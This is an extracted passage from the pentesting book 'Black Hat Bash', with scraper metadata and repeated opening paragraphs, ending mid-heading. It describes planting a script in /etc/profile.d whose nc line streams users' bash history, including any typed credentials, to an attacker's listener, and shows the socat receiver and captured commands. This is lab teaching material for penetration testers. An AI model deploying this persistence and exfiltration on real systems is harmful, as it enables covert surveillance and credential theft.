@@ -1,0 +1,54 @@
+# Security Chapter Extract
+Book: Nick Aleks_ Dolev Farhi - Black Hat Bash_ Creative Scripting for Hackers and Pentesters (2024, NO STARCH PRESS, INC) - libgen.li (1)
+Chapter: 8 - , we discussed history files, such as ~/.bash_history. History files keep a record of commands executed by users and allow for an access, audit, and replay of previously executed commands.
+History files update whenever new commands are executed, so it could be interesting to stream the history files over the network to a listener providing a live record of command-execution events to a server we control. These commands could reveal what users are executing on a server and capture any credentials they enter via the command line. (Note that ~/.bash_history is just an example; you may find it useful to stream other files in your future engagements by using the method shown here.)
+Let’s set up a few bash commands to send the last written command over the network to a remote listener. This technique assumes you have access to a user’s home directory and can modify the ~/.profile file or have the ability to write into the system-wide /etc/profile file.
+On p-jumpbox-01 (172.16.10.13), using the root user, create a file under the /etc/profile.d directory named 99-stream.sh with the contents in Listing 10-7.
+❶ export PROMPT_COMMAND="history -a; history -r; $PROMPT_COMMAND"
+Security Relevance Score: 5
+Word Count: 544
+Extracted: 2025-06-13 23:40:57
+
+---
+
+, we discussed history files, such as ~/.bash_history. History files keep a record of commands executed by users and allow for an access, audit, and replay of previously executed commands.
+History files update whenever new commands are executed, so it could be interesting to stream the history files over the network to a listener providing a live record of command-execution events to a server we control. These commands could reveal what users are executing on a server and capture any credentials they enter via the command line. (Note that ~/.bash_history is just an example; you may find it useful to stream other files in your future engagements by using the method shown here.)
+Let’s set up a few bash commands to send the last written command over the network to a remote listener. This technique assumes you have access to a user’s home directory and can modify the ~/.profile file or have the ability to write into the system-wide /etc/profile file.
+On p-jumpbox-01 (172.16.10.13), using the root user, create a file under the /etc/profile.d directory named 99-stream.sh with the contents in Listing 10-7.
+❶ export PROMPT_COMMAND="history -a; history -r; $PROMPT_COMMAND"
+
+❷ if ! pgrep -u "$(whoami)" nc &> /dev/null; then
+❸ tail -F ~/.bash_history | nc 172.16.10.1 4444 &> /dev/null &
+fi
+
+Listing 10-7: Streaming history files over the network
+At ❶, we export the PROMPT_COMMAND variable to make it available to subsequent commands during execution. We’ll set this variable to a bash command that will execute just before the shell displays the prompt in the terminal. You’ll notice that we pass the history command twice as its value: once with the -a (append) parameter and a second time with the -r (read) parameter. The PROMPT_COMMAND value will execute just before the prompt is shown, allowing us to append to and read from the history file whenever a command is executed.
+We check whether the Netcat (nc) process is running by using pgrep ❷. We use -u (user) with whoami to narrow the process list to only those run by the current user, followed by the process name of nc. If pgrep returns an exit code of 1 (process not found), no reverse shell has connected from this user, so we can establish one. This helps us avoid opening multiple connections from the same user.
+We use the tail command to read the end of the history file and pipe it to nc ❸. The -F (follow) argument tracks the end of the file so any new content gets sent across the wire.
+Finally, we’ll use socat on Kali so we can receive multiple connections without closing the server’s end of the connection if multiple users connect and execute commands simultaneously:
+$ socat TCP4-LISTEN:4444,fork STDOUT
+Open another terminal and log in to p-jumpbox-01 (172.16.10.13) as the user backup (with the previously compromised password backup). Then enter a few commands:
+$ ssh backup@172.16.10.13
+backup@172.16.10.13's password:
+
+backup@p-jumpbox-01:~$ id
+uid=34(backup) gid=34(backup) groups=34(backup)
+
+backup@p-jumpbox-01:~$ whoami
+backup
+
+backup@p-jumpbox-01:~$ uptime
+02:21:50 up 14 days, 12:32,  0 user,  load average: 0.60, 0.40, 0.23
+
+Observe the output from socat:
+$ socat TCP4-LISTEN:4444,fork STDOUT
+
+id
+whoami
+uptime
+
+You could adapt this technique to stream any file of value during a penetration test, such as application or system logfiles.
+
+
+Forging a Not-So-Innocent sudo
+In
